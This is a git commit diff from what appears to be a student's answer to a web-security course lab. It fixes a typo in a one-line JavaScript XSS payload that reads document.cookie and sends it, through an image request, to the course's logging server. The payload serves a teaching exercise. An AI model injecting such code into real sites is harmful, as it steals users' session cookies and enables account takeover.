a169229bda26a21b223b6933852b420a10fcf992
edithwuly <edithwuly@163.com>
2021-05-11 07:05:28 -0400

    part2

--- answer-2.js
+++ answer-2.js
@@ -1,1 +1,1 @@
-(new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=eddithwuly' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();
+(new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=edithwuly' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random();
